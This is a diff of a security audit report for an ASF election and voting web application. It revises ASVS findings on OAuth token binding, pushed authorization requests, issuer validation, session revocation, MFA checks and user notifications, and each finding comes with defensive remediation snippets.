+The application performs sensitive operations (opening/closing elections, creating elections, casting votes) without verifying: (1) acr (Authentication Context Class Reference) — no check that the user authenticated with sufficient assurance level, (2) amr (Authentication Methods References) — no check that specific authentication methods (e.g., MFA) were used, (3) auth_time — no check that authentication occurred recently enough for the operation. The session data (basic_info()) captures no authentication metadata beyond identity. Long-lived sessions could allow sensitive operations long after the original authentication event. A user who authenticated hours or days ago with a weak method (single factor) can perform highly sensitive operations (opening elections that affect organizational governance) without re-authentication or step-up verification.
 
 **Remediation:**
 
-Implement authentication strength verification before sensitive operations. Add a verify_auth_strength function that checks: 1) Authentication recentness using auth_time claim with a maximum age (e.g., 5 minutes for sensitive operations), redirecting to re-authentication if exceeded. 2) Authentication context class (acr) to ensure minimum authentication assurance level. 3) Authentication methods (amr) to verify required authentication methods were used. Apply this verification to all sensitive endpoints including do-vote, do-open, do-close, do-create-election, and do-delete-issue. Store auth_time in the session during initial OAuth authentication and validate it before each sensitive operation.
+Implement a decorator to require recent authentication for sensitive operations. Store auth_time in session and validate it before sensitive operations. Example: Create a require_recent_auth decorator that checks if time.time() - auth_time > SENSITIVE_OPS_MAX_AGE (e.g., 300 seconds), and if exceeded, redirect to re-authentication. Apply this decorator to sensitive endpoints like /do-open/&lt;eid&gt;, /do-create-election, and vote casting operations. Additionally, preserve OAuth token claims (acr, amr, auth_time) in the session when establishing it so they can be verified for sensitive operations.
 
 ---
 
-#### FINDING-101: No Sender-Constrained Access Token Mechanism (mTLS or DPoP)
+#### FINDING-088: No sender-constrained access token mechanisms (mTLS or DPoP) implemented
 
 | Attribute | Value |
 |-----------|-------|
@@ -2056,19 +2080,43 @@ Implement authentication strength verification before sensitive operations. Add 
 | **ASVS Level(s)** | L3 |
 | **CWE** | N/A |
 | **ASVS Sections** | 10.3.5, 10.4.14 |
-| **Files** | v3/server/main.py:39-42, v3/server/main.py:76-79, v3/server/pages.py:82-88 |
+| **Files** | v3/server/main.py:39-42, v3/server/main.py:76-79, v3/server/pages.py |
 | **Source Reports** | 10.3.5.md, 10.4.14.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-The application uses standard OAuth 2.0 bearer tokens without any sender-constraining mechanism. There is no implementation of Mutual TLS (mTLS) for OAuth 2 (RFC 8705) with client certificate binding to tokens, nor DPoP (Demonstration of Proof-of-Possession) (RFC 9449) with proof-of-possession headers. The TLS configuration in main.py (lines 76-79) is server-side TLS only. This is a Level 3 requirement. The absence of sender-constrained tokens means that if an access token (or session cookie) is stolen, it can be used from any network location by any party. This affects both the resource server validation requirements (10.3.5) and authorization server issuance requirements (10.4.14).
+**Description:**
+
+The application does not implement OAuth 2.0 Mutual TLS (RFC 8705) certificate-bound access tokens or DPoP (Demonstration of Proof of Possession) token binding. TLS configuration is standard server-side TLS only (certfile + keyfile for server certificate). The OAuth token exchange URL format shows no DPoP proof parameter. Bearer tokens (or session cookies derived from them) are not bound to any client-specific cryptographic key, making them susceptible to theft and replay. If an access token or session cookie is intercepted (e.g., via XSS, network compromise, or log exposure), it can be replayed from any client without detection. This is a Level 3 requirement, so it represents an advanced security control gap.
 
 **Remediation:**
 
-Implement one of the following sender-constraining mechanisms: Option 1: Implement DPoP - Configure DPoP requirement in create_app() by setting app.config['REQUIRE_DPOP'] = True. Generate a DPoP key pair per-session, create DPoP proof JWTs with appropriate headers (typ: dpop+jwt, alg: ES256, jwk), and payload containing htm (HTTP method), htu (HTTP URI), iat, jti, and optionally ath (hash of access token). Include the DPoP proof in token requests via the DPoP header. Option 2: Implement session binding with client fingerprinting - Bind session to TLS connection attributes. Option 3: Implement mTLS approach - Configure client certificate verification in the application and bind tokens to the certificate thumbprint (cnf.x5t#S256).
+Implement DPoP (Demonstration of Proof of Possession) token binding. Example implementation: Create a DPoP proof JWT using jwcrypto library with ES256 algorithm and P-256 curve. Generate a JWK key pair, create a JWT with 'dpop+jwt' type containing claims for jti (unique identifier), htm (HTTP method), htu (HTTP URI), iat (issued at time), and ath (access token hash when validating). Sign the proof with the private key and include the public key in the JWT header. Alternatively, implement OAuth 2.0 Mutual TLS (RFC 8705) certificate-bound access tokens by requiring client certificates and binding tokens to certificate fingerprints. At minimum, implement session binding to client characteristics with fingerprint verification.
 
 ---
 
-#### FINDING-102: Authorization Code Grant Not Used with Pushed Authorization Requests (PAR)
+#### FINDING-089: OAuth token exchange callback URL does not visibly include client authentication parameters
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2, L3 |
+| **CWE** | N/A |
+| **ASVS Sections** | 10.4.10, 10.4.16 |
+| **Files** | v3/server/main.py:39-42 |
+| **Source Reports** | 10.4.10.md, 10.4.16.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The token exchange URL pattern `https://oauth.apache.org/token?code=%s` passes only the authorization code as a query parameter. There is no evidence of strong client authentication methods being configured: (1) No mutual TLS (`tls_client_auth` / `self_signed_tls_client_auth`) - While the server has TLS certificate configuration, there is no client certificate configuration for outbound connections to the authorization server. (2) No `private_key_jwt` - No JWT signing key configuration is visible for client assertion authentication. (3) No visible `client_secret` - Even basic client_secret_post/client_secret_basic is not configured in the visible code. The `OAUTH_URL_CALLBACK` format suggests the code is passed as a URL query parameter rather than in a POST body with client credentials, which is inconsistent with confidential client behavior. Without strong client authentication, the authorization server cannot reliably verify that token requests originate from the legitimate client. This enables authorization code injection and token theft attacks.
+
+**Remediation:**
+
+Configure mutual TLS for client authentication: asfquart.generics.OAUTH_CLIENT_CERT = '/path/to/client_cert.pem'; asfquart.generics.OAUTH_CLIENT_KEY = '/path/to/client_key.pem'; asfquart.generics.TOKEN_ENDPOINT_AUTH_METHOD = 'tls_client_auth'. Or configure private_key_jwt: asfquart.generics.TOKEN_ENDPOINT_AUTH_METHOD = 'private_key_jwt'; asfquart.generics.CLIENT_ASSERTION_KEY = '/path/to/private_key.pem'; asfquart.generics.CLIENT_ID = 'steve-voting-app'.
+
+---
+
+#### FINDING-090: Authorization code grant flow does not use Pushed Authorization Requests (PAR)
 
 | Attribute | Value |
 |-----------|-------|
@@ -2078,215 +2126,413 @@ Implement one of the following sender-constraining mechanisms: Option 1: Impleme
 | **ASVS Sections** | 10.4.13, 10.4.15 |
 | **Files** | v3/server/main.py:39-42 |
 | **Source Reports** | 10.4.13.md, 10.4.15.md |
-| **Related Findings** | None | **Description:**
+| **Related Findings** | None |
 
-The application uses the authorization code grant type without Pushed Authorization Requests (PAR). The authorization request is constructed as a direct redirect to the authorization endpoint with parameters in the URL (state=%s, redirect_uri=%s). Without PAR: 1) Authorization request parameters are exposed in the browser's address bar and potentially in referrer headers, 2) The redirect_uri and state parameters can be manipulated by the user before the request reaches the authorization server, 3) The authorization request is not authenticated (any party can construct one). At ASVS Level 3, the authorization code flow should always be used with PAR, which authenticates the authorization request, prevents parameter manipulation in the browser, and returns a request_uri that the client sends to the authorization endpoint instead of raw parameters. This also relates to protecting authorization_details parameters from tampering (10.4.15).
+**Description:**
+
+The authorization code grant flow does not use Pushed Authorization Requests (PAR). The authorization request parameters are passed directly in the URL to the authorization endpoint, rather than being pushed beforehand via a backchannel PAR request. Without PAR, authorization request parameters are exposed in the browser URL bar and browser history, can be manipulated by the user-agent or malicious browser extensions, and the redirect_uri is passed in the frontchannel, making it susceptible to parameter pollution attacks. The authorization server cannot verify the authenticity of the authorization request. For an election system, this could theoretically allow manipulation of the OAuth flow to impersonate voters, though the state parameter provides some protection.
 
 **Remediation:**
 
-Implement PAR: push authorization request to AS first, then redirect with request_uri. Step 1: Push Authorization Request (authenticated) using httpx.post to 'https://oauth.apache.org/par' with client_id, client_secret, redirect_uri, state, response_type, scope, and any authorization_details. Step 2: Redirect user with only client_id and request_uri to the authorization endpoint. With PAR, authorization_details would be pushed server-to-server, ensuring parameters originate from the authenticated client backend and are tamper-proof.
+Implement PAR flow by pushing authorization request parameters via backchannel before redirecting the user. Create a function to push authorization request parameters to the PAR endpoint (https://oauth.apache.org/par) with client credentials, response_type, redirect_uri, state, and scope. Then redirect the user with only the client_id and the returned request_uri reference. Implementation depends on oauth.apache.org supporting the PAR endpoint (RFC 9126). The ASF OAuth infrastructure would need to be verified for PAR support.
 
 ---
 
-#### FINDING-103: No replay detection mechanism in session claim consumption
+#### FINDING-091: No Evidence of Refresh Token Handling or Sender-Constraining
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2, L3 |
+| **CWE** | N/A |
+| **ASVS Sections** | 10.4.5 |
+| **Files** | v3/server/main.py:38-42, v3/server/pages.py (entire file) |
+| **Source Reports** | 10.4.5.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The codebase shows no evidence of refresh token storage or usage, DPoP proof generation, mTLS client certificate binding, or refresh token rotation handling on the client side. The session management uses asfquart.session.read() but the framework's internal handling of refresh tokens is not visible. If the framework handles refresh tokens internally without sender-constraining, replay attacks are possible. If the asfquart framework receives and stores refresh tokens from the ASF OAuth server, and neither DPoP nor mTLS is used, a stolen refresh token could be replayed by an attacker to obtain new access tokens.
+
+**Remediation:**
+
+Verify that the asfquart framework either: 1. Does not use refresh tokens (session-only approach), OR 2. Implements DPoP or mTLS for sender-constraining, OR 3. Properly handles refresh token rotation (consuming old tokens). If using refresh tokens, ensure DPoP is configured: asfquart.generics.OAUTH_USE_DPOP = True or verify the framework's session management doesn't rely on refresh tokens.
+
+---
+
+#### FINDING-092: No token/session revocation endpoint or UI present
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2, L1 |
+| **CWE** | N/A |
+| **ASVS Sections** | 10.4.9, 6.1.1, 7.4.5, 14.3.1 |
+| **Files** | v3/server/pages.py (entire file scope) |
+| **Source Reports** | 10.4.9.md, 6.1.1.md, 7.4.5.md, 14.3.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+There is no visible logout endpoint in the provided code. Without a logout mechanism: 1) No Clear-Site-Data header can be sent on session termination, 2) Authenticated session data (cookies, any client-side cached data) persists in the browser indefinitely, 3) If a user walks away from a shared computer, their session remains active, 4) Flash messages (stored in session) containing sensitive election information persist until consumed. The absence of any session termination mechanism violates ASVS 14.3.1 which requires authenticated data to be cleared from client storage after the client or session is terminated.
+
+**Remediation:**
+
+Implement session logout and revocation endpoints. Add a /logout endpoint that destroys the current session and a /revoke-all-sessions endpoint that revokes all sessions for the current user. Example implementation: @APP.get('/logout') @asfquart.auth.require async def logout_page(): session = await asfquart.session.read(); if session: await asfquart.session.destroy(); return quart.redirect('/', code=303). @APP.post('/revoke-all-sessions') @asfquart.auth.require async def revoke_all_sessions(): session = await asfquart.session.read(); if session: await asfquart.session.destroy_all(session['uid']); return quart.redirect('/', code=303)
+
+---
+
+#### FINDING-093: Missing Issuer Validation in OAuth Token Response
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L2 |
-| **CWE** | CWE-294 |
-| **ASVS Sections** | 10.5.1 |
-| **Files** | v3/server/pages.py:82-91 |
-| **Source Reports** | 10.5.1.md |
-| **Related Findings** | None | **Description:**
+| **CWE** | N/A |
+| **ASVS Sections** | 10.5.3 |
+| **Files** | v3/server/main.py:39-42 |
+| **Source Reports** | 10.5.3.md |
+| **Related Findings** | None |
 
-The session is read and user identity values (uid, fullname, email) are consumed directly without any mechanism to detect if the underlying token has been replayed. There is no timestamp comparison, no nonce validation, and no binding to the current session. If session data originates from a replayed token, the application will trust it unconditionally.
+**Description:**
 
-**Remediation:**
-
-Implement token replay detection mechanisms including nonce validation as described in OAUTH-LDAP-002. Additionally, consider adding timestamp-based validation to ensure tokens are not reused beyond their intended lifetime, and bind session data to specific authentication requests.
-
----
-
-#### FINDING-104: No MFA Enforcement or Verification at Application Level
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | CWE-308 |
-| **ASVS Sections** | 6.3.3 |
-| **Files** | v3/server/main.py:38-42, v3/server/pages.py (all @asfquart.auth.require decorators) |
-| **Source Reports** | 6.3.3.md |
-| **Related Findings** | None | **Description:**
-
-The application accepts any valid OAuth token from oauth.apache.org without verifying that the authentication included a second factor. If ASF OAuth allows single-factor authentication for some users, the application would grant access without MFA. User → ASF OAuth (unknown MFA policy) → OAuth token → Application session → Access granted without MFA verification. If the external OAuth provider does not universally enforce MFA, or if its MFA policy changes, users could authenticate to this application with only a single factor (password). For an election/voting application, this represents significant risk of account takeover leading to vote manipulation.
+While the OAuth URLs are hardcoded to `https://oauth.apache.org/`, there is no visible validation that: 1) The token response actually came from `oauth.apache.org`, 2) The `iss` claim in any received ID Token matches the expected issuer URL, 3) Authorization server metadata (if fetched) is validated against the pre-configured issuer. The hardcoded URLs provide a form of issuer pinning for outbound requests, but the requirement specifically mandates validating the issuer in the received response/metadata. Without this validation, a man-in-the-middle or DNS hijack could cause the client to accept tokens from a malicious authorization server. Since the callback handler is in `asfquart` (not provided), we cannot confirm whether issuer validation occurs there. This represents a visibility gap.
 
 **Remediation:**
 
-The application should either: 1. Verify MFA claims in the OAuth token/response (e.g., acr or amr claims in OIDC) 2. Implement a second authentication factor within the application 3. Document that ASF OAuth universally enforces MFA and that this is a dependency. Example: Check authentication method references in OAuth response: async def verify_mfa_in_session(session): """Verify that the OAuth authentication included MFA.""" amr = session.get('amr', []); if len(amr) < 2 or 'mfa' not in amr: quart.abort(403, 'Multi-factor authentication required')
+Configure expected issuer for validation: asfquart.generics.EXPECTED_ISSUER = 'https://oauth.apache.org'. In token validation: if decoded_token['iss'] != EXPECTED_ISSUER: raise SecurityError('Issuer mismatch - possible impersonation')
 
 ---
 
-#### FINDING-105: JWT/Token Signature Validation Not Visible at Application Layer
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L2 |
-| **CWE** | CWE-347 |
-| **ASVS Sections** | 6.8.2 |
-| **Files** | v3/server/main.py:40-43 |
-| **Source Reports** | 6.8.2.md |
-| **Related Findings** | None | **Description:**
-
-The application configures OAuth URL endpoints but the actual token validation logic is encapsulated within the asfquart library, which is not provided for review. There is no visible code in the application layer that validates JWT signatures on ID tokens or access tokens, verifies token issuer (iss) claims, checks token audience (aud) claims, or validates token expiration (exp). The callback URL pattern suggests a simple token exchange without explicit signature verification at the application layer. If the asfquart library does not properly validate token signatures, an attacker could forge authentication assertions. The trust is entirely placed in the library implementation.
-
-**Remediation:**
-
-1. Verify that the asfquart library validates JWT/token signatures 2. Document the signature validation approach 3. Consider adding application-level assertion validation using a library like python-jose to explicitly validate ID token signatures and claims, including checking for unsigned tokens (alg: none), verifying issuer and audience claims, and only allowing expected algorithms like RS256.
-
----
-
-#### FINDING-106: No User Notification When LDAP Profile Data Is Updated
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | CWE-778 |
-| **ASVS Sections** | 6.3.7 |
-| **Files** | v3/server/bin/asf-load-ldap.py:45-62 |
-| **Source Reports** | 6.3.7.md |
-| **Related Findings** | FINDING-107 | **Description:**
-
-When the LDAP synchronization script updates a user's profile information (display name or email address), the user is not notified. While the application doesn't manage authentication credentials directly (those are in ASF's IdP), changes to associated identity information (email, display name) that could indicate account compromise are not communicated to users. If an attacker compromises an ASF account and changes the associated email address in LDAP, the synchronized data would change silently in the voting system. The legitimate user would not receive any notification that their profile was modified, potentially missing a signal of account takeover.
-
-**Remediation:**
-
-Implement change detection and notification in the LDAP sync: for r in results: entry = edict(r[1]); uid = entry.uid[0].decode('utf-8'); visname = entry.cn[0].decode('utf-8'); email = entry['asf-committer-email'][0].decode('utf-8'); # Detect changes before overwriting; try: existing = pdb.get_person(uid); if existing[1] != email: notify_user_profile_change(uid, 'email', existing[1], email); if existing[0] != visname: notify_user_profile_change(uid, 'name', existing[0], visname); except steve.persondb.PersonNotFound: pass; pdb.add_person(uid, visname, email)
-
----
-
-#### FINDING-107: No Suspicious Authentication Notification System
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L3 |
-| **CWE** | CWE-778 |
-| **ASVS Sections** | 6.3.5 |
-| **Files** | All files in scope |
-| **Source Reports** | 6.3.5.md |
-| **Related Findings** | FINDING-106 | **Description:**
-
-The application does not implement any mechanism to detect or notify users about suspicious authentication attempts. Specifically: 1. No unusual location detection: No IP geolocation tracking or comparison with previous logins. 2. No unusual client detection: No user-agent or device fingerprinting. 3. No failed attempt tracking: No counter for failed authentication attempts per user. 4. No inactivity-based alerts: No detection of authentication after long dormancy periods. 5. No successful-after-failed notification: No mechanism to alert when login succeeds after multiple failures. The application delegates authentication entirely to ASF OAuth, but does not receive or process any signals about authentication anomalies from the OAuth provider.
-
-**Remediation:**
-
-Implement authentication event monitoring and notification: async def check_suspicious_auth(session, request): uid = session['uid']; current_ip = request.remote_addr; current_ua = request.headers.get('User-Agent', ''); last_auth = await get_last_auth_record(uid); suspicious = False; if last_auth: if last_auth.ip != current_ip: suspicious = True; if last_auth.user_agent != current_ua: suspicious = True; if (datetime.now() - last_auth.timestamp).days > 90: suspicious = True; if suspicious: await send_notification(uid, 'Suspicious login detected', details); await record_auth_event(uid, current_ip, current_ua)
-
----
-
-#### FINDING-108: Inconsistent Privilege Requirements Create Privilege Escalation Path
+#### FINDING-094: No documented rate limiting, anti-automation, or adaptive response controls for authentication endpoints
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L1 |
 | **CWE** | N/A |
-| **ASVS Sections** | 8.2.1 |
-| **Files** | v3/server/pages.py:435 |
-| **Source Reports** | 8.2.1.md |
-| **Related Findings** | None | **Description:**
+| **ASVS Sections** | 6.1.1, 6.3.1 |
+| **Files** | v3/server/main.py:34-39, v3/server/pages.py (entire file) |
+| **Source Reports** | 6.1.1.md, 6.3.1.md |
+| **Related Findings** | None |
 
-Election creation requires R.pmc_member (PMC member privilege) while all other election operations only require R.committer (committer privilege). This creates a privilege escalation path where a committer cannot create elections but can fully manage (including opening, closing, deleting issues from) elections created by PMC members. The higher-privilege requirement for creation provides no security benefit when any lower-privileged committer can fully manage all existing elections. This inconsistency undermines the privilege model and creates confusion about intended access controls.
+**Description:**
+
+The application delegates authentication to ASF OAuth (oauth.apache.org). However, there is no documentation anywhere in the provided code (comments, docstrings, or configuration) that describes: 1) How rate limiting is configured for the OAuth callback endpoint, 2) Whether the upstream ASF OAuth provider implements anti-automation controls, 3) What adaptive response mechanisms exist (e.g., progressive delays, CAPTCHA escalation), 4) How the system prevents malicious account lockout at the ASF OAuth layer, 5) Whether the application itself implements any secondary rate limiting on session-protected endpoints. The asfquart.auth.require decorator is used extensively across endpoints (with {R.committer}, {R.pmc_member}, or bare), but no per-endpoint rate limiting is applied. Without documented rate limiting controls, there is no assurance that brute force or credential stuffing attacks against the OAuth flow are mitigated. Operational staff cannot verify correct configuration without documentation.
 
 **Remediation:**
 
-Apply consistent authorization at all management endpoints by implementing the ownership and authz group checks described in EAAC-001. This ensures that only authorized users (owners or authz group members) can manage elections, regardless of whether they are PMC members or committers. The R.pmc_member requirement for creation can remain as a separate organizational policy control, but all subsequent management must verify election-specific authorization.
+Create authentication security documentation that specifies: 1) Rate Limiting - OAuth callback endpoint: Delegated to ASF OAuth (oauth.apache.org) with description of specific controls implemented by ASF OAuth and application-level controls (e.g., max 10 auth attempts per IP per minute via reverse proxy), 2) Anti-Automation - CAPTCHA integration and bot detection mechanisms, 3) Adaptive Response - Behavior after N failed attempts and account lockout prevention mechanisms including ASF account unlock procedures, 4) Reverse Proxy Configuration - Apache/nginx rate limit rules with references to config files
 
 ---
 
-#### FINDING-109: Missing Authorization Check in Election Date Modification Helper
-
-| Attribute | Value |
-|-----------|-------|
-| **Severity** | 🟡 Medium |
-| **ASVS Level(s)** | L1 |
-| **CWE** | CWE-639 |
-| **ASVS Sections** | 8.2.2 |
-| **Files** | v3/server/pages.py:75-95 |
-| **Source Reports** | 8.2.2.md |
-| **Related Findings** | FINDING-021, FINDING-022, FINDING-110 | **Description:**
-
-The _set_election_date helper function contains a '# check authz' comment but performs NO authorization check. Any committer can set open_at or close_at dates on any election. This is a specific instance of the BOLA vulnerability (EAAC-001) applied to the date modification helper function. The function proceeds to modify election dates without verifying the authenticated user has permission to manage that election. While the dates are marked as 'purely advisory' in SQL comments, unauthorized modification still represents a security control failure.
-
-**Remediation:**
-
-Implement authorization check in _set_election_date function to verify the authenticated user is the election owner (md.owner_pid == uid) or member of the authz LDAP group before allowing date modifications. This check should follow the same pattern as the check_election_authz() function recommended in EAAC-001. Return 403 Forbidden if authorization fails.
-
-#### FINDING-110: Issue KV Data Exposed Without Role-Based Field Filtering
+#### FINDING-095: Multiple authentication pathways exist but are not documented together with security controls
 
 | Attribute | Value |
 |-----------|-------|
 | **Severity** | 🟡 Medium |
 | **ASVS Level(s)** | L2 |
-| **CWE** | CWE-639 |
-| **ASVS Sections** | 8.2.3 |
-| **Files** | v3/steve/election.py:235-250 |
-| **Source Reports** | 8.2.3.md |
-| **Related** | FINDING-021, FINDING-022, FINDING-109 | **Description:**
+| **CWE** | N/A |
+| **ASVS Sections** | 6.1.3 |
+| **Files** | v3/server/pages.py (multiple locations) |
+| **Source Reports** | 6.1.3.md |
+| **Related Findings** | None |
 
-The list_issues() method returns all KV data including operational configuration fields without filtering based on the caller's role or context. There is no distinction between what fields a voter should see (ballot data like candidates and labelmap) versus what a manager should see (full configuration including internal settings). The kv field contains operational data that may be appropriate for voters, but the method has no field filtering mechanism based on the consumer's role. Any caller (management page OR voting page) receives the full kv field without differentiation, potentially exposing management-specific configuration data to voters.
+**Description:**
+
+The application implements at least three distinct authentication/authorization pathways: 1) Bare session (`@asfquart.auth.require`): `/profile`, `/settings`, `/docs/<iid>/<docname>`, 2) Committer level (`@asfquart.auth.require({R.committer})`): `/voter`, `/admin`, `/manage/<eid>`, all voting and issue management endpoints, 3) PMC member level (`@asfquart.auth.require({R.pmc_member})`): `/do-create-election`. Additionally, the `### need general solution` comments throughout indicate that the authorization model is incomplete and evolving. There is no documentation that defines what security controls apply at each level, describes the authentication strength at each level (all use the same OAuth flow), explains why certain endpoints use one level vs another, or documents the planned "general solution" mentioned in comments. The repeated `### check authz` comments indicate that fine-grained authorization checks are acknowledged as needed but not implemented.
 
 **Remediation:**
 
-Add an include_management_fields parameter (default False) to the list_issues() method to enable field filtering based on access level. When include_management_fields is False, filter the kv dictionary to only include voter-visible fields such as candidates, labelmap, and seats. When True (for management interfaces), return full kv data. Implement role-based field filtering so that management-specific configuration data is only exposed to authorized managers. Update callers to specify appropriate filtering level based on context.
+Create comprehensive authentication pathways documentation covering: 1) OAuth Flow (Primary - All Users) including provider (ASF OAuth), strength (single-factor), session management, and controls, 2) Authorization Levels for Level 0 (Public - No Authentication), Level 1 (Authenticated User - Valid Session), Level 2 (ASF Committer), and Level 3 (PMC Member), 3) Consistency Enforcement noting all pathways use the same ASF OAuth provider with identical authentication strength, with authorization differing by LDAP group membership. Document this in `docs/AUTHENTICATION.md` covering all three ASVS 6.1.x requirements.
 
 ---
 
-#### FINDING-111: No Session Invalidation Mechanism for Authorization Revocations
+#### FINDING-096: No Mechanism for Suspicious Authentication Notifications
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.3.5 |
+| **Files** | v3/server/pages.py (entire file) |
+| **Source Reports** | 6.3.5.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application contains no code to detect or notify users about suspicious authentication attempts. Specifically, it lacks functionality to: (1) Detect authentication attempts from unusual locations or clients, (2) Identify partially successful authentication (one factor only), (3) Notice authentication after long inactivity periods, (4) Track successful authentication following multiple failures, (5) Send notifications to users about any of the above. Users have no visibility into unauthorized access attempts against their accounts. If a session is compromised or an attacker authenticates via stolen OAuth tokens, the legitimate user receives no notification.
+
+**Remediation:**
+
+Implement a suspicious authentication detection and notification system that: (1) Tracks session attributes (IP address, user agent, last activity time) for comparison, (2) Detects anomalies such as new IP addresses, login after extended inactivity (e.g., 90+ days), or unusual client patterns, (3) Sends email notifications to users when suspicious activity is detected, (4) Records session information for future comparison.
+
+---
+
+#### FINDING-097: No Notification Mechanism for Authentication Detail Changes
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.3.7 |
+| **Files** | v3/server/pages.py:603 |
+| **Source Reports** | 6.3.7.md |
+| **Related Findings** | None |
+
+**Description:**
+
+A `/settings` page exists, implying users can modify account details. However: 1. No notification mechanism exists anywhere in the codebase for credential or profile changes. 2. No email sending service is configured or imported. 3. Changes to LDAP-sourced data (username, email) happen externally but the application doesn't verify or notify when these change between sessions. If authentication details are modified at the ASF IdP level (credential reset, email change) or if the application later adds local settings, users will not be notified of changes. This reduces the ability to detect account takeover.
+
+**Remediation:**
+
+Implement profile change detection and notification mechanism. Check stored profile against session data on each login, and if email or other critical attributes have changed, send notification to the old email address before updating.
+
+---
+
+#### FINDING-098: No mechanism for revoking authentication sessions or invalidating user access
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L3 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.5.6 |
+| **Files** | v3/server/pages.py (entire authentication architecture) |
+| **Source Reports** | 6.5.6.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The audited codebase provides no mechanism for revoking authentication sessions or invalidating a user's access independent of the external IdP. While authentication factor management (passwords, TOTP devices, etc.) is delegated to ASF's IdP, the application-level session established after OAuth callback has no visible revocation mechanism in the provided code: (1) No logout endpoint is visible in pages.py, (2) No session invalidation mechanism is exposed to administrators, (3) No 'revoke all sessions' capability for compromised accounts, (4) If an ASF account is compromised, there's no evidence the application can immediately invalidate active sessions. The asfquart.session module handles session management but its implementation is not provided for review.
+
+**Remediation:**
+
+Implement logout endpoint and admin session revocation capability. Add /logout endpoint that invalidates current session using asfquart.session.invalidate(). Add /admin/revoke-sessions/&lt;uid&gt; endpoint for administrators to revoke all sessions for a user.
+
+---
+
+#### FINDING-099: User identity not explicitly namespaced with IdP identifier
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.8.1 |
+| **Files** | v3/server/pages.py:82-93, main.py:39-42, asf-load-ldap.py:54 |
+| **Source Reports** | 6.8.1.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application uses a single `uid` field from the session as the user's identity throughout the system. While currently only one IdP is configured (ASF OAuth at `oauth.apache.org`), there is no IdP namespace stored alongside the user identifier. If the application were extended to support additional identity providers (or if the `asfquart` framework were configured to accept multiple providers), the `uid` field alone could be spoofed across providers. The OAuth configuration in `main.py` (lines 39-42) references only `oauth.apache.org`. Additionally, the LDAP load process in `asf-load-ldap.py` (line 54) stores users by `uid` alone. Mitigating Factor: Currently only one IdP is configured, which significantly reduces the actual exploitation risk.
+
+**Remediation:**
+
+Store and validate a composite key of `(idp_id, user_id)` rather than `user_id` alone. Capture `idp_id` from session (defaulting to 'asf-oauth' for backward compatibility) and create a `composite_id` field in the format `{idp_id}:{uid}`. Update session handling in `basic_info()` to include `idp`, `composite_id` alongside existing `uid`, `name`, and `email` fields. Update PersonDB schema to namespace users with IdP identifier.
+
+---
+
+#### FINDING-100: No documented fallback approach for authentication strength assumptions
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 6.8.4 |
+| **Files** | N/A |
+| **Source Reports** | 6.8.4.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The ASVS requirement states: 'If the IdP does not provide this information, the application must have a documented fallback approach that assumes that the minimum strength authentication mechanism was used.' No such documentation or implementation exists in the codebase. The application treats all authenticated sessions equally regardless of authentication strength.
+
+**Remediation:**
+
+Document the authentication strength assumptions and implement appropriate controls. Example: When IdP does not provide acr/amr claims, assume single-factor authentication. Consequence: Election creation and management operations require re-authentication within 15 minutes. Vote submission allowed with standard session validity.
+
+---
+
+#### FINDING-101: No concurrent session limit enforcement or documentation
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.1.2 |
+| **Files** | v3/server/pages.py:82-92, v3/server/main.py (entire file) |
+| **Source Reports** | 7.1.2.md |
+| **Related Findings** | None |
+
+**Description:**
+
+The application codebase contains no implementation, configuration, or documentation defining the maximum number of concurrent sessions allowed per account, nor any behavior when a limit would be reached. The session management in `pages.py` reads sessions via `asfquart.session.read()` but never checks for or limits concurrent active sessions for the same user. User authenticates via OAuth → session is created → no check against existing active sessions for same `uid` → unlimited concurrent sessions permitted. An attacker who compromises a user's OAuth credentials could maintain persistent access even after the legitimate user changes credentials, as no mechanism detects or limits parallel sessions.
+
+**Remediation:**
+
+Document the session concurrency policy and implement enforcement. In session creation callback (within asfquart framework or custom middleware), check active sessions for the uid, and if the count exceeds MAX_CONCURRENT_SESSIONS (e.g., 3), terminate the oldest session and log the action.
+
+---
+
+#### FINDING-102: No documented coordination between ASF OAuth SSO session lifetime and application session lifetime
+
+| Attribute | Value |
+|-----------|-------|
+| **Severity** | 🟡 Medium |
+| **ASVS Level(s)** | L2 |
+| **CWE** | N/A |
+| **ASVS Sections** | 7.1.3 |
